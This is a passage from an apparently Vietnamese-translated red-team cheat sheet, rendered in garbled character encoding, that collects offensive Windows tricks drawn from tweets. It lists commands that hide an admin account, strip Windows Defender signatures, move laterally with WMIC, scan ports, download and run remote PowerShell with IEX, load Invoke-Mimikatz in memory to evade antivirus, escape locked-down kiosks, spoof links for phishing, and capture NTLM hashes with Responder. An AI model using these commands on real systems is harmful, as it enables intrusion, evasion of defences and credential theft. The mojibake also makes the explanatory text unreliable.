**LÆ°u Ã½:** Lá»‡nh nÃ y Ä‘Æ°á»£c thá»±c thi trÃªn **Windows CMD/PowerShell** vÃ  cáº§n quyá»n **quáº£n trá»‹**. NÃ³ thÃªm má»™t giÃ¡ trá»‹ vÃ o registry Ä‘á»ƒ áº©n má»™t tÃ i khoáº£n cá»¥c bá»™ khá»i mÃ n hÃ¬nh Ä‘Äƒng nháº­p. Ká»¹ thuáº­t nÃ y thÆ°á»ng dÃ¹ng Ä‘á»ƒ duy trÃ¬ truy cáº­p má»™t cÃ¡ch lÃ©n lÃºt.

**MÃ´ táº£:** *'Táº¡o tÃ i khoáº£n ráº¥t rá»§i ro khi nÃ© trÃ¡nh Ä‘á»™i xanh (**blue team**), nhÆ°ng khi táº¡o admin cá»¥c bá»™, hÃ£y dÃ¹ng má»™t sá»‘ mÃ¡nh khÃ³e trong registry Ä‘á»ƒ áº©n nÃ³.'*

**ÄÃ³ng gÃ³p:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**LiÃªn káº¿t:** [Twitter](https://twitter.com/Alh4zr3d/status/1612913838999113728)

### [ğŸ”™](#tool-list)LÃ m tÃª liá»‡t **Windows Defender** báº±ng cÃ¡ch xÃ³a chá»¯ kÃ½

```bash
"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
**LÆ°u Ã½:** Lá»‡nh nÃ y cháº¡y file thá»±c thi cá»§a **Windows Defender** vÃ  ra lá»‡nh xÃ³a táº¥t cáº£ chá»¯ kÃ½ virus. Äiá»u nÃ y cÃ³ thá»ƒ vÃ´ hiá»‡u hÃ³a kháº£ nÄƒng phÃ¡t hiá»‡n pháº§n má»m Ä‘á»™c háº¡i cá»§a **Defender**. NÃ³ cáº§n quyá»n **quáº£n trá»‹** vÃ  cÃ³ thá»ƒ bá»‹ **EDR** hoáº·c chÃ­nh **Defender** cáº£nh bÃ¡o hoáº·c cháº·n.

**MÃ´ táº£:** *'HÆ¡i lá»™n xá»™n má»™t chÃºt, nhÆ°ng náº¿u **Windows Defender** Ä‘ang gÃ¢y Ä‘au Ä‘áº§u cho báº¡n, thay vÃ¬ vÃ´ hiá»‡u hÃ³a nÃ³ (Ä‘iá»u sáº½ bÃ¡o Ä‘á»™ng cho ngÆ°á»i dÃ¹ng), báº¡n chá»‰ cáº§n vÃ´ hiá»‡u hÃ³a nÃ³ báº±ng cÃ¡ch xÃ³a táº¥t cáº£ chá»¯ kÃ½.'*

**ÄÃ³ng gÃ³p:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**LiÃªn káº¿t:** [Twitter](https://twitter.com/Alh4zr3d/status/1611005101262389250)

### [ğŸ”™](#tool-list)Cho phÃ©p nhiá»u phiÃªn **RDP** cho má»—i ngÆ°á»i dÃ¹ng

```bash
reg add HKLM\System\CurrentControlSet\Control\TerminalServer /v fSingleSessionPerUser /d 0 /f
```
**LÆ°u Ã½:** Lá»‡nh nÃ y sá»­a Ä‘á»•i **Windows Registry** Ä‘á»ƒ cho phÃ©p nhiá»u ngÆ°á»i dÃ¹ng cÃ¹ng Ä‘Äƒng nháº­p vÃ o há»‡ thá»‘ng thÃ´ng qua **RDP**, hoáº·c cho phÃ©p má»™t ngÆ°á»i dÃ¹ng cÃ³ nhiá»u phiÃªn **RDP** Ä‘á»“ng thá»i. YÃªu cáº§u quyá»n **quáº£n trá»‹**.

**MÃ´ táº£:** *'ÄÃ´i khi báº¡n muá»‘n Ä‘Äƒng nháº­p vÃ o má»™t mÃ¡y chá»§ qua **RDP** hoáº·c tÆ°Æ¡ng tá»±, nhÆ°ng ngÆ°á»i dÃ¹ng cá»§a báº¡n Ä‘Ã£ cÃ³ má»™t phiÃªn hoáº¡t Ä‘á»™ng. HÃ£y báº­t nhiá»u phiÃªn cho má»—i ngÆ°á»i dÃ¹ng.'*

**ÄÃ³ng gÃ³p:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**LiÃªn káº¿t:** [Twitter](https://twitter.com/Alh4zr3d/status/1609954528425558016)

### [ğŸ”™](#tool-list)Giáº£i phÃ¡p thay tháº¿ cá»¥c bá»™ cho **Sysinternals PsExec.exe**

```bash
wmic.exe /node:10.1.1.1 /user:username /password:pass process call create cmd.exe /c " command "
```
**LÆ°u Ã½:** Lá»‡nh nÃ y sá»­ dá»¥ng tiá»‡n Ã­ch **WMIC** (Windows Management Instrumentation Command-line) Ä‘á»ƒ táº¡o má»™t tiáº¿n trÃ¬nh (thá»±c thi má»™t lá»‡nh) trÃªn mÃ¡y tÃ­nh tá»« xa. ÄÃ¢y lÃ  má»™t phÆ°Æ¡ng phÃ¡p "live off the land" Ä‘á»ƒ thá»±c thi tá»« xa trÃªn **Windows** mÃ  khÃ´ng cáº§n táº£i xuá»‘ng **PsExec.exe**. YÃªu cáº§u thÃ´ng tin xÃ¡c thá»±c quáº£n trá»‹ viÃªn trÃªn mÃ¡y tá»« xa vÃ  cÃ¡c káº¿t ná»‘i **WMI/DCOM** khÃ´ng bá»‹ cháº·n bá»Ÿi firewall.

**MÃ´ táº£:** *'Báº¡n cÃ³ chÃ¡n ngÃ¡n viá»‡c táº£i lÃªn **Sysinternals PsExec.exe** khi thá»±c hiá»‡n di chuyá»ƒn ngang khÃ´ng? **Windows** cÃ³ má»™t giáº£i phÃ¡p thay tháº¿ tá»‘t hÆ¡n Ä‘Æ°á»£c cÃ i Ä‘áº·t sáºµn. HÃ£y thá»­ cÃ¡i nÃ y.'*

**ÄÃ³ng gÃ³p:** [@GuhnooPlusLinux](https://twitter.com/GuhnooPlusLinux)

**LiÃªn káº¿t:** [Twitter](https://twitter.com/GuhnooPlusLinux/status/1607473627922063360)

### [ğŸ”™](#tool-list)MÃ¡y quÃ©t cá»•ng "**Live off the land**"

```bash
0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect(<tgt_ip>,$_)) "Port $_ open"} 2>$null
```
**LÆ°u Ã½:** Äoáº¡n mÃ£ nÃ y sá»­ dá»¥ng **PowerShell** Ä‘á»ƒ thá»­ káº¿t ná»‘i tá»›i táº¥t cáº£ cÃ¡c cá»•ng (tá»« 0 Ä‘áº¿n 65535) trÃªn má»™t Ä‘á»‹a chá»‰ IP má»¥c tiÃªu cá»¥ thá»ƒ (`<tgt_ip>`). Náº¿u káº¿t ná»‘i thÃ nh cÃ´ng, nÃ³ sáº½ in thÃ´ng bÃ¡o "Port <sá»‘ cá»•ng> open". ÄÃ¢y lÃ  má»™t cÃ¡ch Ä‘Æ¡n giáº£n Ä‘á»ƒ quÃ©t cá»•ng chá»‰ báº±ng cÃ¡c **lá»‡nh cÃ³ sáºµn trong Windows**, trÃ¡nh táº£i xuá»‘ng cÃ¡c cÃ´ng cá»¥ quÃ©t chuyÃªn dá»¥ng.

**MÃ´ táº£:** *'Khi cÃ³ thá»ƒ, hÃ£y "**live off the land**" thay vÃ¬ táº£i **cÃ´ng cá»¥** lÃªn mÃ¡y (vÃ¬ nhiá»u lÃ½ do). **PowerShell/.NET** giÃºp Ã­ch. VÃ­ dá»¥: **mÃ¡y quÃ©t cá»•ng** Ä‘Æ¡n giáº£n trong **Powershell**.'*

**ÄÃ³ng gÃ³p:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**LiÃªn káº¿t:** [Twitter](https://twitter.com/Alh4zr3d/status/1605060950339588096)

### [ğŸ”™](#tool-list)PowerShell DownloadString cÃ³ há»— trá»£ proxy

```bash
$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("<url>")
```
**LÆ°u Ã½:** Äoáº¡n mÃ£ nÃ y sá»­ dá»¥ng lá»›p `Net.WebClient` trong **PowerShell** Ä‘á»ƒ táº£i xuá»‘ng má»™t chuá»—i (thÆ°á»ng lÃ  má»™t **script** hoáº·c **payload**) tá»« má»™t **URL** (`<url>`). Äáº·c Ä‘iá»ƒm quan trá»ng lÃ  nÃ³ thiáº¿t láº­p thÃ´ng tin xÃ¡c thá»±c proxy máº·c Ä‘á»‹nh cá»§a máº¡ng (`[Net.CredentialCache]::DefaultNetworkCredentials`), cho phÃ©p hoáº¡t Ä‘á»™ng táº£i xuá»‘ng thÃ nh cÃ´ng ngay cáº£ trong cÃ¡c mÃ´i trÆ°á»ng cÃ³ yÃªu cáº§u xÃ¡c thá»±c proxy. `IEX` lÃ  bÃ­ danh cho `Invoke-Expression`, Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ thá»±c thi chuá»—i Ä‘Ã£ táº£i xuá»‘ng.

**MÃ´ táº£:** *'Háº§u háº¿t cÃ¡c tá»• chá»©c lá»›n Ä‘á»u sá»­ dá»¥ng **proxy web** hiá»‡n nay. HÃ m **DownloadString PowerShell** tiÃªu chuáº©n khÃ´ng há»— trá»£ **proxy**. HÃ£y sá»­ dá»¥ng cÃ¡i nÃ y.'*

**ÄÃ³ng gÃ³p:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**LiÃªn káº¿t:** [Twitter](https://twitter.com/Alh4zr3d/status/1596192664398966785)

### [ğŸ”™](#tool-list)TÃ¬m kiáº¿m cÃ¡c **endpoint ná»™i bá»™** trong dáº¥u trang trÃ¬nh duyá»‡t

```bash
type "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.bak" | findstr /c "name url" | findstr /v "type"
```
**LÆ°u Ã½:** Lá»‡nh nÃ y sá»­ dá»¥ng cÃ¡c tiá»‡n Ã­ch dÃ²ng lá»‡nh cá»§a **Windows** (`type` vÃ  `findstr`) Ä‘á»ƒ Ä‘á»c ná»™i dung tá»‡p sao lÆ°u dáº¥u trang cá»§a Google Chrome vÃ  tÃ¬m kiáº¿m cÃ¡c dÃ²ng chá»©a cáº£ "name" vÃ  "url", sau Ä‘Ã³ loáº¡i bá» cÃ¡c dÃ²ng chá»©a "type". NÃ³ nháº±m má»¥c Ä‘Ã­ch lá»c ra tÃªn vÃ  **URL** cá»§a cÃ¡c dáº¥u trang Ä‘á»ƒ tÃ¬m kiáº¿m cÃ¡c tÃ i nguyÃªn ná»™i bá»™ mÃ  ngÆ°á»i dÃ¹ng Ä‘Ã£ lÆ°u. Tá»‡p dáº¥u trang cÃ³ thá»ƒ cÃ³ vá»‹ trÃ­ hÆ¡i khÃ¡c tÃ¹y phiÃªn báº£n Chrome vÃ  **HÄH**.

**MÃ´ táº£:** *'Báº¡n sáº½ ngáº¡c nhiÃªn vá»›i nhá»¯ng gÃ¬ báº¡n cÃ³ thá»ƒ tÃ¬m tháº¥y chá»‰ tá»« dáº¥u trang cá»§a ngÆ°á»i dÃ¹ng. CÃ¡c **endpoint ná»™i bá»™** mÃ  há» cÃ³ thá»ƒ truy cáº­p, cháº³ng háº¡n.'*

**ÄÃ³ng gÃ³p:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**LiÃªn káº¿t:** [Twitter](https://twitter.com/Alh4zr3d/status/1595488676389171200)

### [ğŸ”™](#tool-list)Truy váº¥n báº£n ghi **DNS** Ä‘á»ƒ liá»‡t kÃª

```bash
Get-DnsRecord -RecordType A -ZoneName FQDN -Server <server hostname>
```
**LÆ°u Ã½:** Lá»‡nh nÃ y sá»­ dá»¥ng **PowerShell** Ä‘á»ƒ truy váº¥n mÃ¡y chá»§ **DNS** cá»¥ thá»ƒ (`<server hostname>`) Ä‘á»ƒ láº¥y cÃ¡c báº£n ghi loáº¡i **A** (Ã¡nh xáº¡ tÃªn mÃ¡y chá»§ thÃ nh Ä‘á»‹a chá»‰ IPv4) trong má»™t vÃ¹ng **DNS** Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh (`ZoneName`). Ká»¹ thuáº­t nÃ y cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ liá»‡t kÃª cÃ¡c mÃ¡y chá»§ vÃ  dá»‹ch vá»¥ trong má»™t **domain** náº¿u báº¡n cÃ³ quyá»n truy váº¥n mÃ¡y chá»§ **DNS**. ThÆ°á»ng hoáº¡t Ä‘á»™ng tá»‘t nháº¥t náº¿u báº¡n cÃ³ quyá»n xÃ¡c thá»±c vá»›i mÃ¡y chá»§ **DNS**, hoáº·c náº¿u mÃ¡y chá»§ cho phÃ©p truy váº¥n khÃ´ng xÃ¡c thá»±c (thÆ°á»ng lÃ  sai cáº¥u hÃ¬nh báº£o máº­t).

**MÃ´ táº£:** *'Liá»‡t kÃª (**enumeration**) lÃ  95% trÃ² chÆ¡i. Tuy nhiÃªn, cháº¡y hÃ ng táº¥n **quÃ©t** Ä‘á»ƒ Ä‘Ã¡nh giÃ¡ mÃ´i trÆ°á»ng ráº¥t á»“n Ã o. Táº¡i sao khÃ´ng chá»‰ há»i **DC/DNS server** táº¥t cáº£ cÃ¡c báº£n ghi **DNS**?'*

**ÄÃ³ng gÃ³p:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**LiÃªn káº¿t:** [Twitter](https://twitter.com/Alh4zr3d/status/1587132627823181824)

### [ğŸ”™](#tool-list)TÃ¬m Ä‘Æ°á»ng dáº«n dá»‹ch vá»¥ khÃ´ng cÃ³ dáº¥u ngoáº·c kÃ©p mÃ  khÃ´ng cáº§n **PowerUp**

```bash
Get-CIMInstance -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**LÆ°u Ã½:** Äoáº¡n mÃ£ **PowerShell** nÃ y truy váº¥n cÃ¡c dá»‹ch vá»¥ **Windows** báº±ng `Get-CIMInstance`. NÃ³ lá»c ra cÃ¡c dá»‹ch vá»¥ cÃ³ cháº¿ Ä‘á»™ khá»Ÿi Ä‘á»™ng lÃ  "Auto" (tá»± Ä‘á»™ng cháº¡y khi khá»Ÿi Ä‘á»™ng), khÃ´ng náº±m trong thÆ° má»¥c `C:\Windows*` (Ä‘á»ƒ loáº¡i bá» cÃ¡c dá»‹ch vá»¥ há»‡ thá»‘ng chÃ­nh) vÃ  cÃ³ Ä‘Æ°á»ng dáº«n thá»±c thi (`PathName`) KHÃ”NG Ä‘Æ°á»£c Ä‘áº·t trong dáº¥u ngoáº·c kÃ©p. CÃ¡c Ä‘Æ°á»ng dáº«n khÃ´ng cÃ³ dáº¥u ngoáº·c kÃ©p vÃ  cÃ³ chá»©a khoáº£ng tráº¯ng cÃ³ thá»ƒ dáº«n Ä‘áº¿n lá»— há»•ng **"Unquoted Service Path"**, cho phÃ©p thá»±c thi mÃ£ tÃ¹y Ã½ náº¿u káº» táº¥n cÃ´ng cÃ³ thá»ƒ ghi tá»‡p vÃ o Ä‘Æ°á»ng dáº«n trÆ°á»›c dáº¥u khoáº£ng tráº¯ng.

**MÃ´ táº£:** *'TÃ¬m cÃ¡c Ä‘Æ°á»ng dáº«n dá»‹ch vá»¥ khÃ´ng cÃ³ dáº¥u ngoáº·c kÃ©p mÃ  khÃ´ng cáº§n **PowerUp**'*

**ÄÃ³ng gÃ³p:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**LiÃªn káº¿t:** [Twitter](https://twitter.com/Alh4zr3d/status/1579254955554136064)

### [ğŸ”™](#tool-list)Bypass dáº¥u nháº¯c lá»‡nh bá»‹ táº¯t vá»›i **/k**

```bash
# Win+R (Äá»ƒ má»Ÿ há»™p Run)
cmd.exe /k "whoami"
```
**LÆ°u Ã½:** Lá»‡nh nÃ y sá»­ dá»¥ng tÃ¹y chá»n `/k` cá»§a **CMD**, tÃ¹y chá»n nÃ y thá»±c thi lá»‡nh theo sau vÃ  *sau Ä‘Ã³* giá»¯ cá»­a sá»• **CMD** má»Ÿ. Trong má»™t sá»‘ mÃ´i trÆ°á»ng bá»‹ háº¡n cháº¿ chá»‰ hiá»ƒn thá»‹ thÃ´ng bÃ¡o "CMD Ä‘Ã£ bá»‹ vÃ´ hiá»‡u hÃ³a" vÃ  sau Ä‘Ã³ thoÃ¡t, viá»‡c sá»­ dá»¥ng `/k` tá»« há»™p Run (`Win+R`) cÃ³ thá»ƒ cho phÃ©p lá»‡nh Ä‘Æ°á»£c thá»±c thi thÃ nh cÃ´ng *trÆ°á»›c khi* thÃ´ng bÃ¡o Ä‘Æ°á»£c hiá»ƒn thá»‹.

**MÃ´ táº£:** *'Dáº¥u nháº¯c lá»‡nh nÃ y Ä‘Ã£ bá»‹ quáº£n trá»‹ viÃªn cá»§a báº¡n vÃ´ hiá»‡u hÃ³a...' ThÆ°á»ng cÃ³ thá»ƒ tháº¥y trong cÃ¡c mÃ´i trÆ°á»ng nhÆ° mÃ¡y tÃ­nh **kiosk**, má»™t cÃ¡ch giáº£i quyáº¿t nhanh vÃ  **hacky** lÃ  sá»­ dá»¥ng `/k` qua há»™p Run cá»§a **Windows**. Thao tÃ¡c nÃ y sáº½ thá»±c hiá»‡n lá»‡nh vÃ  sau Ä‘Ã³ hiá»ƒn thá»‹ thÃ´ng bÃ¡o háº¡n cháº¿, cho phÃ©p thá»±c thi lá»‡nh.*

**ÄÃ³ng gÃ³p:** Martin Sohn Christensen

**LiÃªn káº¿t:** [Blog](https://improsec.com/tech-blog/the-command-prompt-has-been-disabled-by-your-administrator-press-any-key-to-continue-or-use-these-weird-tricks-to-bypass-admins-will-hate-you)

### [ğŸ”™](#tool-list)NgÄƒn **Windows Defender** xÃ³a **mimikatz.exe**

```bash
(new-object net.webclient).downloadstring('https://raw.githubusercontent[.]com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')|IEX;inv
```
**LÆ°u Ã½:** Äoáº¡n mÃ£ **PowerShell** nÃ y táº£i xuá»‘ng **script PowerShell Invoke-Mimikatz.ps1** trá»±c tiáº¿p tá»« GitHub (lÆ°u Ã½ thá»§ thuáº­t thay tháº¿ `.` báº±ng `[.]` Ä‘á»ƒ nÃ© trÃ¡nh cÃ¡c cÆ¡ cháº¿ phÃ¡t hiá»‡n Ä‘Æ¡n giáº£n) vÃ o bá»™ nhá»› vÃ  thá»±c thi nÃ³ báº±ng `IEX` (Invoke-Expression), sau Ä‘Ã³ gá»i hÃ m chÃ­nh `inv` trong **script**. Viá»‡c nÃ y thá»±c thi chá»©c nÄƒng tÆ°Æ¡ng tá»± **mimikatz.exe** nhÆ°ng trong bá»™ nhá»›, khÃ³ bá»‹ **Windows Defender** dá»±a trÃªn chá»¯ kÃ½ tá»‡p phÃ¡t hiá»‡n.

**MÃ´ táº£:** *'Báº¡n cÃ³ chÃ¡n ngÃ¡n viá»‡c **Windows Defender** xÃ³a **mimikatz.exe** khÃ´ng? HÃ£y thá»­ cÃ¡ch nÃ y thay tháº¿.'*

**ÄÃ³ng gÃ³p:** [@GuhnooPlusLinux](https://twitter.com/GuhnooPlusLinux)

**LiÃªn káº¿t:** [Twitter](https://twitter.com/GuhnooPlusLinux/status/1605629049660809216)

### [ğŸ”™](#tool-list)Kiá»ƒm tra xem báº¡n cÃ³ Ä‘ang á»Ÿ trong **mÃ¡y áº£o** khÃ´ng

```bash
reg query HKLM\SYSTEM /s | findstr /S "VirtualBox VBOX VMWare"
```
**LÆ°u Ã½:** Lá»‡nh nÃ y sá»­ dá»¥ng tiá»‡n Ã­ch **Windows** `reg query` Ä‘á»ƒ tÃ¬m kiáº¿m Ä‘á»‡ quy (sá»­ dá»¥ng `/s`) trong khÃ³a registry `HKLM\SYSTEM`. Káº¿t quáº£ Ä‘áº§u ra sau Ä‘Ã³ Ä‘Æ°á»£c lá»c báº±ng `findstr` Ä‘á»ƒ tÃ¬m cÃ¡c chuá»—i nhÆ° "VirtualBox", "VBOX", hoáº·c "VMWare", lÃ  cÃ¡c dáº¥u hiá»‡u cho tháº¥y há»‡ thá»‘ng Ä‘ang cháº¡y trong má»™t **mÃ¡y áº£o** phá»• biáº¿n.

**MÃ´ táº£:** *'Báº¡n muá»‘n biáº¿t mÃ¬nh cÃ³ Ä‘ang á»Ÿ trong **MÃ¡y áº£o** khÃ´ng? Truy váº¥n cÃ¡c khÃ³a registry vÃ  tÃ¬m hiá»ƒu!!! Náº¿u cÃ³ báº¥t ká»³ káº¿t quáº£ nÃ o xuáº¥t hiá»‡n thÃ¬ báº¡n Ä‘ang á»Ÿ trong **MÃ¡y áº£o**.'*

**ÄÃ³ng gÃ³p:** [@dmcxblue](https://twitter.com/dmcxblue)

**LiÃªn káº¿t:** [Twitter](https://twitter.com/dmcxblue/status/1366779034672136194)

### [ğŸ”™](#tool-list)Liá»‡t kÃª quy táº¯c **AppLocker**

```
(Get-AppLockerPolicy -Local).RuleCollections

Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse

reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh nÃ y giÃºp liá»‡t kÃª cáº¥u hÃ¬nh **AppLocker** trÃªn há»‡ thá»‘ng **Windows**.
`Get-AppLockerPolicy` (PowerShell) láº¥y policy AppLocker Ä‘ang hoáº¡t Ä‘á»™ng.
`Get-ChildItem` (PowerShell) vÃ  `reg query` (CMD) kiá»ƒm tra trá»±c tiáº¿p cÃ¡c khÃ³a registry nÆ¡i **AppLocker** lÆ°u trá»¯ quy táº¯c cá»§a nÃ³. Hiá»ƒu cÃ¡c quy táº¯c nÃ y giÃºp káº» táº¥n cÃ´ng tÃ¬m cÃ¡c binary hoáº·c **script** Ä‘Æ°á»£c phÃ©p thá»±c thi hoáº·c cÃ¡c ká»¹ thuáº­t bypass.

**MÃ´ táº£:** *'**AppLocker** cÃ³ thá»ƒ gÃ¢y phiá»n toÃ¡i. HÃ£y liá»‡t kÃª Ä‘á»ƒ xem má»©c Ä‘á»™ khÃ³ chá»‹u Ä‘áº¿n Ä‘Ã¢u'*

**ÄÃ³ng gÃ³p:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**LiÃªn káº¿t:** [Twitter](https://twitter.com/alh4zr3d/status/1614706476412698624)

### [ğŸ”™](#tool-list)Lá»‘i táº¯t **CMD** vá»›i 6 pixel qua **mspaint**

![image](https://user-images.githubusercontent.com/100603074/223849011-24db49d7-37b0-4dad-a7a6-db046f6cb7da.png)

1. Má»Ÿ **MSPaint.exe** vÃ  Ä‘áº·t kÃ­ch thÆ°á»›c canvas thÃ nh: Width=6 vÃ  Height=1 pixel
2. Thu phÃ³ng Ä‘á»ƒ thá»±c hiá»‡n cÃ¡c tÃ¡c vá»¥ sau dá»… dÃ ng hÆ¡n
3. Sá»­ dá»¥ng cÃ´ng cá»¥ chá»n mÃ u (**color picker**), Ä‘áº·t giÃ¡ trá»‹ pixel (tá»« trÃ¡i sang pháº£i):
    - 1st: R: 10, G: 0, B: 0
    - 2nd: R: 13, G: 10, B: 13
    - 3rd: R: 100, G: 109, B: 99
    - 4th: R: 120, G: 101, B: 46
    - 5th: R: 0, G: 0, B: 101
    - 6th: R: 0, G: 0, B: 0
4. LÆ°u tá»‡p dÆ°á»›i dáº¡ng **24-bit Bitmap** (*.bmp;*.dib)
5. Äá»•i pháº§n má»Ÿ rá»™ng tá»« bmp sang bat vÃ  cháº¡y.
**LÆ°u Ã½:** ÄÃ¢y lÃ  má»™t ká»¹ thuáº­t nÃ¢ng cao khai thÃ¡c cÃ¡ch Ä‘á»‹nh dáº¡ng tá»‡p **BMP** lÆ°u trá»¯ dá»¯ liá»‡u mÃ u Ä‘á»ƒ mÃ£ hÃ³a cÃ¡c kÃ½ tá»± ASCII vÃ o pháº§n Ä‘áº§u tá»‡p khÃ´ng pháº£i pixel. Khi Ä‘á»•i tÃªn thÃ nh `.bat` vÃ  cháº¡y, trÃ¬nh thÃ´ng dá»‹ch lá»‡nh sáº½ Ä‘á»c cÃ¡c byte nÃ y nhÆ° lá»‡nh vÃ  thá»±c thi chÃºng, cÃ³ thá»ƒ dÃ¹ng Ä‘á»ƒ gá»i `cmd.exe`. Hiá»‡u quáº£ cá»§a ká»¹ thuáº­t nÃ y phá»¥ thuá»™c vÃ o cÃ¡ch há»‡ thá»‘ng xá»­ lÃ½ tá»‡p.

**MÃ´ táº£:** *'Má»™t phÆ°Æ¡ng phÃ¡p khÃ¡c thÆ°á»ng nhÆ°ng hiá»‡u quáº£ Ä‘á»ƒ láº¥y **shell** báº±ng cÃ¡ch táº¡o lá»‘i táº¯t Ä‘áº¿n **cmd.exe** thÃ´ng qua viá»‡c váº½ cÃ¡c mÃ u cá»¥ thá»ƒ trong **Microsoft Paint**. Do thuáº­t toÃ¡n mÃ£ hÃ³a Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ ghi cÃ¡c tá»‡p **BMP**, cÃ³ thá»ƒ Ä‘á»‹nh rÃµ dá»¯ liá»‡u ASCII Ä‘Æ°á»£c ghi vÃ o tá»‡p báº±ng cÃ¡ch cáº©n tháº­n chá»n cÃ¡c mÃ u **RGB** nháº¥t Ä‘á»‹nh.'*

**ÄÃ³ng gÃ³p:** [PenTestPartners](https://www.pentestpartners.com/)

**LiÃªn káº¿t:** [Blog](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/#gainingacommandshell)

### [ğŸ”™](#tool-list)Giáº£ máº¡o liÃªn káº¿t vá»›i phÆ°Æ¡ng thá»©c JavaScript **PreventDefault**

![image](https://user-images.githubusercontent.com/100603074/223849419-c65fec83-ca1c-4a20-ac06-ec2de537a748.png)

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>PreventDefault Example</title>
  </head>
  <body>
    <a href="https://google.com" onclick="event.preventDefault(); window.location.href = 'https://bing.com';">Go to Google</a>
  </body>
</html>
```
**LÆ°u Ã½:** Äoáº¡n mÃ£ HTML vÃ  JavaScript nÃ y minh há»a cÃ¡ch sá»­ dá»¥ng phÆ°Æ¡ng thá»©c `event.preventDefault()` Ä‘á»ƒ ngÄƒn hÃ nh vi máº·c Ä‘á»‹nh cá»§a má»™t liÃªn káº¿t (`<a>` tag). Trong trÆ°á»ng há»£p nÃ y, máº·c dÃ¹ `href` trá» Ä‘áº¿n `google.com` (Ä‘Ã¢y lÃ  URL hiá»ƒn thá»‹ khi di chuá»™t qua liÃªn káº¿t), hÃ m `onclick` sá»­ dá»¥ng `preventDefault()` Ä‘á»ƒ ngÄƒn trÃ¬nh duyá»‡t Ä‘i tá»›i `google.com` vÃ  thay vÃ o Ä‘Ã³ sá»­ dá»¥ng `window.location.href = 'https://bing.com'` Ä‘á»ƒ chuyá»ƒn hÆ°á»›ng ngÆ°á»i dÃ¹ng Ä‘áº¿n `bing.com`. Ká»¹ thuáº­t nÃ y lá»«a ngÆ°á»i dÃ¹ng nghÄ© ráº±ng há» sáº½ truy cáº­p má»™t trang web an toÃ n nhÆ°ng thá»±c táº¿ bá»‹ Ä‘Æ°a Ä‘áº¿n trang Ä‘á»™c háº¡i.

**MÃ´ táº£:** *CÃ¡c tÃ¡c nhÃ¢n Ä‘e dá»a Ä‘Ã£ Ä‘Æ°á»£c quan sÃ¡t sá»­ dá»¥ng ká»¹ thuáº­t nÃ y Ä‘á»ƒ lá»«a náº¡n nhÃ¢n nháº¥p vÃ o cÃ¡c liÃªn káº¿t táº£i xuá»‘ng pháº§n má»m Ä‘á»™c háº¡i Ä‘Æ°á»£c giáº£ máº¡o trÃªn trang. Sá»­ dá»¥ng phÆ°Æ¡ng thá»©c **JavaScript PreventDefault** báº¡n cÃ³ thá»ƒ giáº£ máº¡o liÃªn káº¿t khi di chuá»™t (**hover link**) Ä‘á»ƒ hiá»ƒn thá»‹ má»™t liÃªn káº¿t há»£p phÃ¡p `google.com`, nhÆ°ng khi nháº¥p vÃ o, náº¡n nhÃ¢n sáº½ Ä‘Æ°á»£c chuyá»ƒn hÆ°á»›ng Ä‘áº¿n liÃªn káº¿t Ä‘á»™c háº¡i cá»§a báº¡n `bing.com`. Tuyá»‡t vá»i Ä‘á»ƒ khiáº¿n náº¡n nhÃ¢n táº£i xuá»‘ng **payload** thÃ´ng qua má»™t trang web do báº¡n kiá»ƒm soÃ¡t.*

**LiÃªn káº¿t:** [TÃ i liá»‡u **PreventDefault**](https://developer.mozilla.org/en-US/docs/Web/API/Event/preventDefault)

### [ğŸ”™](#tool-list)Kiá»ƒm tra quy táº¯c **firewall SMB** vá»›i **Responder**

![image](https://user-images.githubusercontent.com/100603074/229650380-b651cfc4-896f-4429-b7b4-54d1241a5b39.png)

```powershell
Copy-Item -Path "C:\tmp\" -Destination "\\<ip_running_responder>\c$"
```
**LÆ°u Ã½:** Lá»‡nh **PowerShell** nÃ y cá»‘ gáº¯ng sao chÃ©p cÃ¡c tá»‡p tá»« thÆ° má»¥c cá»¥c bá»™ `C:\tmp\` trÃªn mÃ¡y Windows sang thÆ° má»¥c chia sáº» `c$` trÃªn má»™t Ä‘á»‹a chá»‰ IP tá»« xa (`<ip_running_responder>`) nÆ¡i **cÃ´ng cá»¥ Responder** Ä‘ang cháº¡y vÃ  láº¯ng nghe káº¿t ná»‘i **SMB**. Náº¿u tÆ°á»ng lá»­a vÃ  cáº¥u hÃ¬nh máº¡ng cho phÃ©p káº¿t ná»‘i **SMB** ra ngoÃ i, mÃ¡y Windows sáº½ cá»‘ gáº¯ng xÃ¡c thá»±c (gá»­i **hash NTLM**) Ä‘á»ƒ truy cáº­p chia sáº», vÃ  **Responder** cÃ³ thá»ƒ báº¯t Ä‘Æ°á»£c **hash** nÃ y. ÄÃ¢y lÃ  cÃ¡ch kiá»ƒm tra cÃ¡c quy táº¯c firewall outbound.

